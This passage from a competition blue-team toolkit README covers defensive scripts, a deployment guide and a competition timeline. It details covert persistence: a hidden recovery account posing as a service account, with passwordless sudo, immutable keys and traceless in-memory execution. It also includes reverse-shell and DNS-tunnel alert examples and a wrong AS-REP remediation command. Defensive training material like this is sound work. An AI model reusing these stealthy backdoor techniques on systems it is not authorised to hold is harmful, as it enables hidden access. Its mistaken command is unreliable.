| `bt_watch_log <user@host> "" <logfile>` | Stream a remote log to your terminal live |
| `bt_dashboard` | tmux session with one pane per host, all streaming auth.log |
| `bt_status_all` | Quick service health table across every host |
| `bt_add_host <user@ip> <label>` | Add a machine to your fleet |
| `bt_help` | Print all commands |

**Usage:**
```bash
# Once, on your admin machine
sudo bash pcdc_admin_setup.sh

# Every new terminal
source ~/.blueTeam_profile

# Add your machines from the Blue Team Packet
bt_add_host root@10.0.1.10 "web server"
bt_add_host root@10.0.1.11 "mail server"
bt_add_host root@10.0.1.12 "database"

# Push SSH key to everything so passwords aren't needed again
bt_push_key_all "packetpassword"

# Run audit across ALL machines simultaneously — one command
bt_run_all ~/blueTeam/scripts/pcdc_linux_audit.sh

# Live log dashboard — one tmux pane per host
bt_dashboard

# Covert single-host script execution
bt_run_covert ~/blueTeam/scripts/pcdc_webapp_audit.sh root@10.0.1.10
```

> 🔑 **The most important opsec rule:** your admin machine should have **no inbound SSH**
> if possible. It holds keys to everything. Treat it accordingly.

---

### 🔐 `pcdc_recovery_access.sh`
**Break-glass recovery access for your own machines.**

Scenario: it's hour three of the competition. Red team has persistence on your
mail server. They notice you're onto them. They change the root password, lock
your packet accounts, and sit back. You're locked out of a machine you're scored on.

Without recovery access pre-deployed: you're done. Two revert tokens, both gone,
points hemorrhaging, teammates staring at you.

With recovery access pre-deployed: you SSH in on your recovery account, reset
every password, and file an incident report. Net outcome: you recovered, they didn't
win, and you have documented evidence for the Gold Team.

> *Every real-world sysadmin maintains break-glass access to their own infrastructure.*
> *This is that, for an asteroid mining colony.*

**Six layers, each independent — taking out one doesn't take out the rest:**

| Layer | Mechanism | Survives |
|---|---|---|
| 1 | Recovery account with unknown password | Packet credential compromise |
| 2 | SSH key auth on recovery account | Password changes on recovery account |
| 3 | Admin key on root's authorized_keys | Recovery account deletion |
| 4 | Sudoers drop file — NOPASSWD:ALL | Main sudoers tampering |
| 5 | PubkeyAuthentication enforced in sshd | Red team setting key auth to `no` |
| 6 | `chattr +i` immutability on key files | Automated wipe of authorized_keys |

**The recovery account (`svcmon` by default)** sits in the UID 900-999 range with a
comment of "System Monitor Service." It looks like a legitimate service account.
It is not in your Blue Team Packet. The red team has never seen its password.
Its SSH key doesn't depend on that password at all.

> ⚠️ **Change the default username before pushing to GitHub.**
> `svcmon` is the default in the script. Pick something that fits your scenario
> theme — `drillmon`, `astralog`, `lifesys` — anything that looks plausible on a
> space mining colony's Linux box. A thorough red teamer reads public repos.

**Usage:**
```bash
# Deploy covertly via your admin machine — script never touches target disk
source ~/.blueTeam_profile
bt_run_covert ~/blueTeam/scripts/pcdc_recovery_access.sh root@10.0.1.10

# Or deploy to every machine at once
bt_run_all ~/blueTeam/scripts/pcdc_recovery_access.sh
```

**If you actually get locked out:**
```bash
# Method 1 — SSH key to recovery account (works even if password was changed)
ssh -i ~/blueTeam/keys/pcdc_admin svcmon@10.0.1.10
sudo passwd root                  # reset root
sudo usermod -U locked_user       # unlock a locked account
sudo chage -E -1 locked_user      # un-expire an expired account

# Method 2 — SSH key directly to root (if recovery account was deleted)
ssh -i ~/blueTeam/keys/pcdc_admin root@10.0.1.10

# Method 3 — if key auth was somehow disabled
ssh svcmon@10.0.1.10              # use recovery password (memorized, not written)
sudo sed -i 's/PubkeyAuthentication no/PubkeyAuthentication yes/' /etc/ssh/sshd_config
sudo systemctl restart sshd       # keys work again
```

---

### 🩺 `pcdc_recovery_check.sh`
**Recovery path integrity monitor. Run from your admin machine.**

Recovery access only helps if it's still there when you need it.
This script tests all three recovery paths — key to recovery account, key to root,
recovery account existence — across every host in your fleet and gives you a
clean status table in seconds.

Run it every 30 minutes. If a host degrades from HEALTHY to DEGRADED or
RECOVERY LOST, you know before you need it and can re-deploy immediately.

> *Discovering your recovery access is gone at the exact moment you need it*
> *is a special kind of bad timing that this script exists to prevent.*

**Usage:**
```bash
# From your admin machine
bash pcdc_recovery_check.sh
```

**What the output looks like:**
```
HOST                 KEY→ROOT     KEY→RECOV    RECOV_USER   STATUS
────────────────────────────────────────────────────────────────
10.0.1.10            OK           OK           EXISTS       HEALTHY
10.0.1.11            OK           FAIL         EXISTS       DEGRADED (root key only)
10.0.1.12            FAIL         FAIL         GONE         RECOVERY LOST
────────────────────────────────────────────────────────────────

Total: 3   Healthy: 1   Degraded: 1   Lost: 1

ACTION REQUIRED:
  Re-deploy recovery access to affected hosts:
  bt_run_covert ~/blueTeam/scripts/pcdc_recovery_access.sh root@10.0.1.11
  bt_run_covert ~/blueTeam/scripts/pcdc_recovery_access.sh root@10.0.1.12
```

```
HEALTHY   — both recovery paths intact, you're good
DEGRADED  — root key works but recovery account was tampered with
            re-deploy before it gets worse
RECOVERY LOST — red team found and removed your access
            re-deploy immediately via root key while you still can
```

---

### 🧅 `pcdc_securityonion.sh`
**Security Onion integration bridge.**

Security Onion is its own platform — you don't install it from this toolkit,
you connect to it. This script is the bridge between your admin machine and
a running SO instance, giving you alert streaming, custom rule deployment,
and IOC hunting without having to live inside the SO web UI all day.

> *Your host-based scripts see what's happening on individual machines.*
> *Security Onion sees what's happening between them.*
> *You need both. This script connects them.*

**Four functions:**

🔴 **`monitor`** — Polls the SO API every 30 seconds and streams alerts to your
terminal, color-coded by severity. High alerts go straight to your incident log.
One terminal running this means you never miss a network-level detection.

📋 **`rules`** — Generates and deploys 25 custom Snort/Suricata detection rules
tuned specifically for PCDC attack patterns that the default SO ruleset misses:
reverse shells over common ports, PHP webshell POST patterns, DNS tunneling
signatures, SSH/RDP/MySQL brute force, port scan detection, oversized ICMP,
path traversal attempts, and data exfiltration by payload size.

🔍 **`hunt`** — Given a suspicious IP, port, or signature from your host-based
alerts, queries Security Onion for correlated network evidence. This is your
pivot point — host artifact discovered, network confirmation sought.

💓 **`status`** — Quick connectivity and auth check on your SO instance, plus
direct links to the key SO interfaces: Alerts, Hunt, Dashboards, and PCAP.

**Setup:**
```bash
# Point it at your SO instance before running
export SO_HOST=10.0.1.x      # your Security Onion IP
export SO_USER=your_user     # SO web UI username
export SO_PASS=your_pass     # SO web UI password

# Verify connectivity
bash pcdc_securityonion.sh status

# Stream alerts to your terminal (run in dedicated terminal)
bash pcdc_securityonion.sh monitor

# Deploy custom PCDC detection rules
bash pcdc_securityonion.sh rules

# Hunt for a specific IP you found in a host-based alert
bash pcdc_securityonion.sh hunt
```

**What to look for:**
```
[SO-HIGH]  2026-04-12T09:14:22 | PCDC SSH Brute Force Detected
           Src: 10.0.1.99:54231 → Dst: 10.0.1.10:22
→ Brute force in progress. Cross-reference 10.0.1.99 — is it in your packet?
  If not: unaccounted host on your VLAN. Ask White Team immediately.
  Block at firewall. File incident report.

[SO-HIGH]  2026-04-12T09:31:07 | PCDC SMB Lateral Movement Attempt
           Src: 10.0.1.10:49822 → Dst: 10.0.1.11:445
→ Red team pivoting from web server to database server over SMB.
  Run pcdc_linux_audit.sh on both hosts immediately.
  Check for new accounts, new scheduled tasks, new SUID binaries.

[SO-MED]   2026-04-12T10:02:44 | PCDC Possible DNS Tunnel - Long Query
           Src: 10.0.1.12:53341 → Dst: 8.8.8.8:53
→ Database server making suspiciously long DNS queries.
  bt_run_covert pcdc_alias_detector_v2.sh root@10.0.1.12
  Check for iodine, dnscat processes.
```

> ⚠️ **Important:** SO API endpoints vary between Security Onion versions.
> The script handles SO 2.x format and falls back to direct Elasticsearch
> queries if the API path differs. Run `status` first to confirm connectivity
> before competition day.

---

## 🚀 Deployment
*(Getting Your Arsenal to Astra 9)*

There are two ways to run this toolkit. Pick one before competition day and practice it.

---

### 🐳 Option A: Docker Container *(Recommended)*

The container is the cleanest approach. Every dependency is pre-installed,
every tool is the right version, and you go from zero to operational in two minutes.
No `apt install`, no missing packages, no "it worked at home" surprises.

> *Think of it as your hacking lair, pre-packed and ready to deploy.*
> *Like a go-bag, but for cyber defense. And with more bash.*

#### Prerequisites

```bash
# Install Docker on your Ubuntu admin machine (one time)
curl -fsSL https://get.docker.com | sudo sh
sudo usermod -aG docker $USER
newgrp docker               # apply group change without logging out

# Verify
docker --version
```

#### Build the Image

```bash
# Clone the repo onto your admin machine
git clone https://github.com/adamisanerd/pcdc26.git
cd pcdc26

# Build — downloads Ubuntu 22.04 and installs all tools
# Takes 2-3 minutes on first build, much faster after (layer cache)
bash container_run.sh build
```

> ⚠️ **Do this at home before competition day.**
> Competition internet may be slow or restricted.
> Build the image on your own network where you control the bandwidth.

#### Save the Image for Offline Use *(Highly Recommended)*

```bash
# Save the built image to a file — no internet needed on competition day
docker save astra9-blueteam:latest | gzip > astra9-blueteam.tar.gz

# On competition day, load it directly
docker load < astra9-blueteam.tar.gz

# Verify it loaded
docker images astra9-blueteam
```

The compressed image is around 500-600MB. Keep it somewhere you can access
on competition day — your home directory, a pre-approved cloud drive, or
pre-loaded onto your admin machine the night before.

#### Run the Container

```bash
# Interactive — drops you straight into the Blue Team shell
bash container_run.sh run

# You'll see the banner, tool verification, and quick-start menu
# SSH key is auto-generated on first run
# bt_help shows all available commands
```

#### All Container Commands

```bash
bash container_run.sh build         # Build the image from scratch
bash container_run.sh run           # Run interactively (most common)
bash container_run.sh start         # Start in background
bash container_run.sh attach        # Attach to a running background container
bash container_run.sh status        # Show image, container, and volume status
bash container_run.sh logs          # View container output
bash container_run.sh export-logs   # Copy logs from container to host filesystem
bash container_run.sh rebuild       # Full rebuild without cache (after code changes)
bash container_run.sh clean         # Remove container and image (keeps volumes)
```

#### Container Volumes — Your Data Persists

The container uses named Docker volumes so your data survives container restarts:

| Volume | Contents | Lost on container stop? |
|---|---|---|
| `blueteam-keys` | SSH key pair | No — persists forever |
| `blueteam-logs` | All script output logs | No — persists forever |
| `blueteam-reports` | Incident reports | No — persists forever |
| `blueteam-config` | hosts.txt fleet file | No — persists forever |

```bash
# Export logs from container to host filesystem at end of competition
bash container_run.sh export-logs ./competition-logs
```

#### Why `--network host`?

The container runs with `network_mode: host` — it shares your admin machine's
actual network stack rather than running in an isolated Docker network.
This is required for:
- `nmap` to see and scan your actual VLAN subnet
- SSH connections to reach your target machines
- `tcpdump` to capture traffic on your real interface
- Port checks in `bt_status_all` to reflect real network state

Without `--network host`, the container would be talking to a virtual network
that can't reach your competition machines. So that flag stays.

---

### 🔧 Option B: Direct Install *(No Docker)*

If Docker isn't available or whitelisted, run the admin setup script directly
on your Ubuntu machine instead.

```bash
# Clone the repo
git clone https://github.com/adamisanerd/pcdc26.git
cd pcdc26
chmod +x *.sh

# Run the admin setup — installs all dependencies, generates SSH key,
# installs shell functions into ~/.blueTeam_profile
sudo bash pcdc_admin_setup.sh

# Load shell functions into your current session
source ~/.blueTeam_profile

# Verify tools are installed
bt_help
```

The `pcdc_admin_setup.sh` script installs the same tools the Dockerfile does —
nmap, sshpass, tmux, tshark, etc. — directly onto the host machine via apt.
Everything else works identically to the container version.

---

### Getting Scripts onto Target Machines

The preferred method is **never copying scripts to targets** — use `bt_run_covert`
to pipe them through SSH stdin instead. Scripts execute in memory and leave
no trace on the target filesystem.

```bash
# Covert single-host execution (script never written to target disk)
bt_run_covert pcdc_linux_audit.sh root@10.0.1.10

# Or hit every host simultaneously
bt_run_all pcdc_linux_audit.sh
```

If you need to physically copy scripts for some reason:
```bash
# SCP to a specific target
scp -i ~/blueTeam/keys/pcdc_admin pcdc_linux_audit.sh root@10.0.1.10:/tmp/
ssh -i ~/blueTeam/keys/pcdc_admin root@10.0.1.10 "bash /tmp/pcdc_linux_audit.sh"
```

> **Whitelist reminder:** Get these domains approved through your PCDC POC
> before competition day:
> - `github.com` — to clone the repo
> - `hub.docker.com` — to pull the Ubuntu base image (or pre-build offline)
> - `archive.ubuntu.com` — for apt packages during image build
>
> If any of these are blocked, use the offline image approach above.

### 📺 Terminal Layout

Your admin machine runs the show. Open these terminals on your Ubuntu client:

| Terminal | Role | Command |
|---|---|---|
| 1 | 👁️ The Eye | `bt_dashboard` *(all hosts streaming auth.log)* |
| 2 | 🧅 The Onion | `bash pcdc_securityonion.sh monitor` *(SO alert stream)* |
| 3 | 📢 The Voice *(Captain)* | Inject system + team comms |
| 4 | 🤲 The Hands | `bt_run_covert` for targeted work + incident response |

On each **target machine**, open two terminals via `bt_ssh`:

| Terminal | Role | Command |
|---|---|---|
| 1 | 🚨 Port Watch | `sudo /bin/bash pcdc_port_monitor_v2.sh --paranoid` |
| 2 | 👂 System Watch | `sudo /bin/bash pcdc_linux_monitor.sh 45` |

### ⏱️ Competition Timeline

```
T-NIGHT  Night before competition — do this at home:
         └─ git clone https://github.com/adamisanerd/pcdc26.git
            bash container_run.sh build
            docker save astra9-blueteam:latest | gzip > astra9-blueteam.tar.gz
            Change recovery account username in pcdc_recovery_access.sh
            Copy .ps1 scripts to a location accessible on competition day
            Practice: bash container_run.sh run → bt_help

T-1 DAY  Pre-competition prep on your admin machine:
         └─ docker load < astra9-blueteam.tar.gz   ← if not pre-loaded
            bash container_run.sh run               ← verify everything works
            Confirm hosts.txt is ready for your packet machines

T+0:00  Access granted. Clock is ticking.
        │
        ├─ LINUX ADMIN MACHINE (container):
        │   bash container_run.sh run
        │   sudo bash pcdc_network_enum.sh          ← MAP THE NETWORK FIRST
        │   sudo bash pcdc_ssh_validator.sh         ← find what credentials work
        │   bt_push_key_all "packetpassword"        ← deploy SSH keys everywhere
        │   bt_run_all pcdc_linux_audit.sh          ← audit every Linux host at once
        │   bt_run_all pcdc_recovery_access.sh      ← plant recovery access NOW
        │   bash pcdc_recovery_check.sh             ← verify it all worked
        │   bt_run_covert pcdc_linux_harden.sh      ← harden each Linux machine
        │
        └─ WINDOWS MACHINES (simultaneously — assign one person per box):
            Set-ExecutionPolicy Bypass -Scope Process -Force
            .\pcdc_win_audit.ps1                    ← audit first, always
            .\pcdc_win_ad_audit.ps1                 ← if DC is in your packet
            .\pcdc_win_harden.ps1                   ← harden interactively

T+0:XX  Red team attacks begin. Grace period over.
        └─ LINUX ADMIN MACHINE:
            bash pcdc_securityonion.sh monitor      ← Terminal 2 (SO alert stream)
            bash pcdc_securityonion.sh rules        ← deploy custom detection rules
            bt_dashboard                            ← Terminal 1 (host log view)
           LINUX TARGETS — dedicated terminals:
            pcdc_port_monitor_v2.sh --paranoid      ← Terminal 1 each box
            pcdc_linux_monitor.sh 45                ← Terminal 2 each box
           WINDOWS TARGETS — dedicated PowerShell window:
            .\pcdc_win_monitor.ps1 -Interval 45 -Services "w3svc","dns"

Every 30 min:
        └─ bash pcdc_recovery_check.sh             ← recovery paths still intact?
           bt_run_all pcdc_alias_detector_v2.sh    ← Linux shells still clean?
           bt_run_all pcdc_webapp_audit.sh         ← any new webshells?
           bt_run_all pcdc_privesc_detector.sh     ← new SUID? sudo changes?
           sudo bash pcdc_network_enum.sh          ← any new hosts appeared?
           (Windows — press 'r' in monitor window) ← Windows incident report

On any [ALERT]:
        └─ Linux: sudo /bin/bash pcdc_runbook.sh triage
           Windows: Stop-Process -Id <PID> -Force  ← kill the threat
           Both: sudo bash pcdc_incident_report.sh ← recover those points
```

On lockout:
        └─ ssh -i ~/blueTeam/keys/pcdc_admin svcmon@<host>
           sudo passwd root && sudo passwd <locked_user>
           bash pcdc_recovery_check.sh             ← verify re-access
           bt_run_covert pcdc_recovery_access.sh root@<host>  ← re-plant
```

---

## 📁 Log Files

Everything from target machines lands in `/var/log/blueTeam/`.
Everything from your admin machine lands in `~/blueTeam/logs/`.
Bring both directories to your end-of-day presentation.

**Target machine logs** (`/var/log/blueTeam/`):

| File | Contents |
|---|---|
| `audit_TIMESTAMP.log` | Pre-hardening system snapshot |
| `harden_TIMESTAMP.log` | Every hardening action taken |
| `incidents_TIMESTAMP.log` | Your greatest hits *(and their greatest hits on you)* |
| `portmon_v2_TIMESTAMP.log` | Full port monitoring session |
| `alias_v2_TIMESTAMP.log` | Shell environment forensics |
| `webapp_TIMESTAMP.log` | Web application scan results |
| `privesc_TIMESTAMP.log` | Privilege escalation sweep |
| `portstate/binary_hashes.baseline` | Service binary SHA256 fingerprints at T+0 |
| `portstate/proc_listeners.baseline` | Kernel-level port baseline |

**Admin machine logs** (`~/blueTeam/logs/`):

| File | Contents |
|---|---|
| `network_map_TIMESTAMP.txt` | Full network map and host inventory |
| `credential_map_TIMESTAMP.txt` | Which creds work on which hosts *(no passwords stored)* |
| `ssh_validator_TIMESTAMP.log` | Full credential sweep session |
| `covert_<host>_<script>_TIMESTAMP.log` | Remote script output per host |
| `parallel_<host>_<script>_TIMESTAMP.log` | bt_run_all output per host |

> *Timestamp your incident reports with HH:MM precision.*
> *"Sometime in the afternoon" will not recover your points.*

---

## 📦 Complete Script Inventory

| Script | Category | When to Run | Where to Run |
|---|---|---|---|
| `pcdc_admin_setup.sh` | Admin | Once, pre-competition | Linux admin machine |
| `pcdc_network_enum.sh` | Recon | T+0:00, then every 30 min | Linux admin machine |
| `pcdc_ssh_validator.sh` | Recon | T+0:05 after enum | Linux admin machine |
| `pcdc_recovery_access.sh` | Recovery | T+0:10, before attacks | Linux admin → targets via `bt_run_covert` |
| `pcdc_recovery_check.sh` | Recovery | Every 30 min | Linux admin machine |
| `pcdc_securityonion.sh` | NSM Bridge | T+0:00 status, then monitor | Linux admin machine |
| `pcdc_linux_audit.sh` | Audit | T+0:00, once per machine | Linux targets |
| `pcdc_linux_harden.sh` | Hardening | T+0:05, after audit | Linux targets |
| `pcdc_scored_service_validate.sh` | Validation | T+0:08, after hardening and after major service changes | Linux targets |
| `pcdc_alias_detector_v2.sh` | Detection | T+0:10, then every 30 min | Linux targets |
| `pcdc_webapp_audit.sh` | Detection | T+0:10, then every 30 min | Linux targets |
| `pcdc_privesc_detector.sh` | Detection | T+0:10, then every 30 min | Linux targets |
| `pcdc_port_monitor_v2.sh` | Monitoring | Continuous, dedicated terminal | Linux targets |
| `pcdc_linux_monitor.sh` | Monitoring | Continuous, dedicated terminal | Linux targets |
| `pcdc_soceng_defense.sh` | Defense | On any suspicious inject | Any machine |
| `pcdc_incident_report.sh` | Response | Every detected attack | Any machine |
| `pcdc_runbook.sh` | Orchestration | Phase transitions | Linux targets |
| **`pcdc_win_audit.ps1`** | **Audit** | **T+0:00, every Windows machine** | **Windows targets** |
| **`pcdc_win_harden.ps1`** | **Hardening** | **T+0:05, after audit** | **Windows targets** |
| **`pcdc_win_monitor.ps1`** | **Monitoring** | **Continuous, dedicated window** | **Windows targets** |
| **`pcdc_win_ad_audit.ps1`** | **AD Audit** | **T+0:00 if DC in packet** | **Domain Controller** |
| `pcdc_alias_detector.sh` | Detection | Legacy/lightweight use | Linux targets |
| `pcdc_port_monitor.sh` | Monitoring | Legacy/lightweight use | Linux targets |

---

## 🚫 What These Scripts Don't Cover
*(Honest Limitations, Because Overconfidence is a Vulnerability)*

---

## 🪟 Windows Toolkit
*(Because Half Your Machines Run Windows and Your Windows Teammates Deserve Tools Too)*

> *"In every competition there is one Windows machine that nobody hardened.*
> *Don't let that be your Windows machine."*

Four PowerShell scripts covering the same depth as the Linux toolkit.
All run on Windows 10, 11, Server 2016, Server 2019 — everything the
PCDC packet lists as possible Windows targets.

### First Things First — Execution Policy

PowerShell blocks script execution by default. Run this on every Windows
machine before anything else:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```

This applies to the current session only — doesn't persist, doesn't
require a reboot, completely reversible.

---

### 🔭 `pcdc_win_audit.ps1`
**Read-only Windows system audit. Run this first on every Windows machine.**

Same philosophy as `pcdc_linux_audit.sh` — touches nothing, changes nothing,
documents everything. Your pre-flight checklist for Windows.

**What it checks:**
- All local user accounts — enabled status, last login, password expiry
- Local Administrators group — who's in there that shouldn't be
- Accounts with no password required *(open doors)*
- Accounts with password never set to expire *(forgotten service accounts)*
- Recently created accounts in the last 7 days
- Password policy via `secedit` — minimum length, complexity, lockout threshold
- All listening TCP/UDP ports with owning process name and PID
- Established connections — flags shells/scripts with network connections
- Routing table and DNS configuration
- Hosts file entries *(red team loves planting entries here)*
- Network shares — flags non-admin shares
- SMBv1 status *(EternalBlue/WannaCry vector)*
- SMB signing status *(relay attack protection)*
- Running services — non-standard binary paths flagged
- Services set to auto-start but currently stopped
- Non-Microsoft scheduled tasks *(primary Windows persistence location)*
- Registry Run keys — HKLM and HKCU *(startup persistence)*
- Winlogon registry entries *(advanced persistence)*
- Windows Firewall status across all profiles
- Custom firewall rules
- Windows Defender status and real-time protection
- Running processes — flags injected/hollow processes with no file path
- PowerShell processes with their full command lines
- RDP configuration and NLA status
- Recent Security event log — logins, failures, account changes, brute force
- Installed software — flags known attack tools
- Patch status and pending Windows Updates

**Usage:**
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\pcdc_win_audit.ps1
```

**What to look for:**
```
[BAD]   SMBv1 ENABLED — EternalBlue/WannaCry risk
→ Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

[BAD]   Firewall DISABLED: Public profile — CRITICAL
→ Set-NetFirewallProfile -Profile Public -Enabled True

[WARN]  Non-standard path: SuspiciousSvc → C:\Users\Public\svc.exe
→ Get-Process, check what that binary actually is, remove if rogue

[WARN]  Non-Microsoft scheduled task: UpdateHelper → C:\Temp\update.ps1
→ Disable-ScheduledTask, investigate the script

[WARN]  SHELL HAS NETWORK CONNECTION: powershell.exe (PID 4821) → 10.0.1.99:4444
→ Reverse shell. Stop-Process -Id 4821 -Force, then investigate entry point
```

---

### 🔒 `pcdc_win_harden.ps1`
**Interactive Windows hardening. Prompts before every change.**

The Windows equivalent of `pcdc_linux_harden.sh`. Walks through every
hardening step, asking confirmation before anything significant.

> ⚠️ **Run `pcdc_win_audit.ps1` first** so you know what you're hardening.
> **Do NOT reboot during competition** unless absolutely necessary — it
> disrupts scored services and costs points.

**What it does:**
- Password resets for all enabled local accounts
- Account lockdown — disable/remove suspicious accounts, review admin group
- Rename the built-in Administrator account
- Disable Guest account
- Password policy hardening — min 12 chars, complexity, lockout after 5
- Windows Firewall — enable all profiles, set default inbound to block,
  add rules for each scored service
- SMBv1 — disable it, every time, no exceptions
- SMB signing — require it to prevent relay attacks
- Remove non-admin shares you don't recognize
- RDP hardening — require NLA, optionally restrict to specific IP
- Stop and disable unnecessary services (Telnet, SNMP, Remote Registry, etc.)
- Disable suspicious scheduled tasks
- Clean up registry Run key persistence entries
- Windows Defender — enable real-time protection, behavior monitoring,
  network protection, cloud protection
- Comprehensive audit policy — enables logging for all critical event categories
- Increases Security event log to 100MB so logs don't roll over
- Windows Update — finds and installs pending patches

**Usage:**
```powershell
# Must run as Administrator
Set-ExecutionPolicy Bypass -Scope Process -Force
.\pcdc_win_harden.ps1
```

**After running — verify these immediately:**
```powershell
# Confirm scored services still running
Get-Service w3svc, mssqlserver, dns, lanmanserver | Select Name, Status

# Confirm firewall is up but not blocking the scorer
Test-NetConnection -ComputerName <scoring_engine_ip> -Port 80

# Confirm RDP still reachable if it's scored
Test-NetConnection -ComputerName localhost -Port 3389
```

---

### 👁️ `pcdc_win_monitor.ps1`
**Continuous Windows system monitor. Run in a dedicated PowerShell window.**

Baselines the system at startup then diffs every cycle — the Windows
equivalent of `pcdc_linux_monitor.sh`. Press `r` to generate an
instant incident report. Jitters its sleep interval to prevent red team
timing attacks between checks.

**What it monitors:**
- New local user accounts since baseline
- New members added to local Administrators group
- New listening ports — name and owning process
- New services installed since baseline
- New scheduled tasks since baseline
- New registry Run key entries *(persistence)*
- Shells/script engines with active network connections *(reverse shells)*
- Brute force detection — 10+ failed logins in 2 minutes
- Scored service health with auto-restart attempt
- Windows Defender disabled or real-time protection turned off
- New network shares created

**Usage:**
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force

# Specify your scored services by name
.\pcdc_win_monitor.ps1 -Interval 45 -Services "w3svc","dns","mssqlserver"

# Press 'r' to generate an instant incident report
```

**What to look for:**
```
[ALERT]   NEW LOCAL ADMINISTRATOR: DOMAIN\suspicious_user
→ Remove immediately: Remove-LocalGroupMember -Group Administrators -Member suspicious_user
  Then investigate how they got added. File incident report.

[ALERT]   NEW LISTENING PORT: 0.0.0.0:4444 owned by powershell (PID 6621)
→ Stop-Process -Id 6621 -Force
  Then investigate: Get-WinEvent -LogName Security | Where Id -eq 4688

[ALERT]   SCORED SERVICE DOWN: w3svc — attempting restart
→ Monitor auto-restart. If it fails: Get-EventLog -LogName System -Source *IIS* -Newest 10

[ALERT]   WINDOWS DEFENDER DISABLED — was enabled at baseline
→ Set-MpPreference -DisableRealtimeMonitoring $false
  Then investigate who disabled it and how.
```

---

### 🏰 `pcdc_win_ad_audit.ps1`
**Active Directory audit. Run this if ANY machine in your packet is a DC.**

If your Blue Team Packet includes a Domain Controller, this script is
mandatory. AD is the crown jewel of any Windows network — owning it
means owning every machine in the domain. Red team knows this. This
script checks for every classic AD attack setup vector.

> *"Domain Admins should have as few members as your team has fingers.*
> *If you need both hands to count them, that's too many."*

**What it checks:**
- Membership in all privileged groups — Domain Admins, Enterprise Admins,
  Schema Admins, Account Operators, Backup Operators, Server Operators
- **Kerberoastable accounts** — users with SPNs set. Red team can request
  their service tickets and crack them offline. Fix: strong 25+ char
  passwords or migrate to Group Managed Service Accounts (gMSA)
- **AS-REP roastable accounts** — accounts with pre-auth disabled. Red team
  can request their hash without any credentials. Fix: enable pre-auth
- **AdminCount=1 accounts** — historically privileged accounts with relaxed
  ACL inheritance. Common lateral movement target
- Password-never-expires accounts *(forgotten service accounts = weak passwords)*
- Stale accounts not logged in for 30+ days
- Recently created domain accounts *(red team may have added one)*
- Group Policy Objects sorted by modification time — new/modified GPOs
  are a classic persistence mechanism
- Domain trusts — bidirectional trusts mean compromise propagates both ways
- SYSVOL and NETLOGON scripts — recently modified scripts are a red flag
- DC event logs for **DCSync indicators** (Event 4662 with replication GUIDs)
- DC event logs for **Golden Ticket indicators** (RC4 Kerberos in an AES domain)
- DC event logs for **Pass-the-Hash** (NTLM network logons)
- krbtgt password age — old krbtgt = Golden Tickets potentially still valid

**Usage:**
```powershell
# On a DC or machine with RSAT AD tools
Set-ExecutionPolicy Bypass -Scope Process -Force
Import-Module ActiveDirectory
.\pcdc_win_ad_audit.ps1

# Install RSAT if needed:
Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0
```

**What to look for:**
```
[BAD]   Kerberoastable: svc_backup | SPNs: MSSQLSvc/db01.corp.local
→ Set a 25+ character random password on this account immediately.
  Better: migrate to gMSA (Group Managed Service Account)

[BAD]   AS-REP Roastable: jsmith
→ Set-ADUser jsmith -KerberosEncryptionType AES256
  (This enables pre-authentication requirement)

[BAD]   [RECENT] GPO: WindowsUpdate_Settings — MODIFIED 2h ago
→ Someone modified a GPO recently. Get-GPOReport to see what changed.
  Red team uses GPOs for persistence and lateral movement.

[BAD]   POSSIBLE DCSYNC: 2026-04-12 10:23:44
→ Someone may have performed a DCSync attack (dumped all password hashes).
  Treat ALL domain credentials as compromised. Reset krbtgt TWICE.
  Reset all privileged account passwords immediately.
```

---

### 🪟 Windows Day-of Workflow

```powershell
# T+0:00 — On every Windows machine simultaneously

# 1. Enable script execution
Set-ExecutionPolicy Bypass -Scope Process -Force

# 2. Audit first — understand before touching
.\pcdc_win_audit.ps1

# 3. If there's a DC — audit AD immediately
Import-Module ActiveDirectory
.\pcdc_win_ad_audit.ps1

# 4. Harden — interactive, prompts before each change
.\pcdc_win_harden.ps1

# 5. Monitor — dedicated PowerShell window, runs all competition
.\pcdc_win_monitor.ps1 -Interval 45 -Services "w3svc","dns","mssqlserver"
# Press 'r' to generate incident report when attacks are detected
```

### Windows Quick Reference — Commands to Know Cold

```powershell
# User management
Get-LocalUser                                    # list all local users
Get-LocalGroupMember -Group "Administrators"     # list local admins
New-LocalUser "username" -Password (Read-Host -AsSecureString)
Disable-LocalUser "username"
Remove-LocalUser "username"

# Service management
Get-Service | Where Status -eq Running           # running services
Start-Service "servicename"
Stop-Service "servicename"
Set-Service "servicename" -StartupType Disabled

# Network
Get-NetTCPConnection -State Listen               # open ports
Get-NetTCPConnection -State Established          # active connections
Get-NetFirewallProfile                           # firewall status
New-NetFirewallRule -DisplayName "Allow80" -Direction Inbound -Protocol TCP -LocalPort 80 -Action Allow

# Process investigation
Get-Process | Sort CPU -Descending              # top processes by CPU
Get-Process -Id <PID>                           # specific process
(Get-CimInstance Win32_Process -Filter "ProcessId=<PID>").CommandLine
Stop-Process -Id <PID> -Force                   # kill process

# Scheduled tasks
Get-ScheduledTask | Where State -ne Disabled    # all active tasks
Disable-ScheduledTask -TaskName "name"
Remove-ScheduledTask -TaskName "name" -Confirm:$false

# Event logs
Get-WinEvent -LogName Security -MaxEvents 50    # recent security events
Get-WinEvent -LogName Security | Where Id -eq 4625 | Select -First 20  # failed logins

# SMB
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force   # disable SMBv1
Get-SmbShare                                    # list shares
Remove-SmbShare -Name "sharename" -Force        # remove share

# Windows Defender
Get-MpComputerStatus                            # defender status
Set-MpPreference -DisableRealtimeMonitoring $false  # enable real-time
Start-MpScan -ScanType QuickScan               # quick scan
```

**Security Onion.** The packet specifically recommends it, and they're right.
Assign one person as your dedicated Snort/Zeek analyst with `pcdc_securityonion.sh monitor`
running in their terminal. The SO integration script bridges your toolkit to a running
SO instance — it streams alerts, deploys custom rules, and lets you hunt for network
evidence correlated to host-based findings. What it can't do is replace having someone
actually watching the SO dashboards and PCAP viewer for anomalies that don't trigger
a rule. Human eyes on Security Onion are irreplaceable.

**The scoring engine.** Find out which IPs and ports Gold Team uses to check your
services. Whitelist them *before* applying default-deny firewall rules.
Blocking the scoring engine looks identical to a Red Team takedown from a points
perspective, and is significantly more embarrassing to explain.

**Sleep.** Chronically, deeply under-covered by this toolkit.
Address this before competition day. You will not think clearly on three hours of sleep
when someone is actively trying to hack your asteroid mining colony.

---

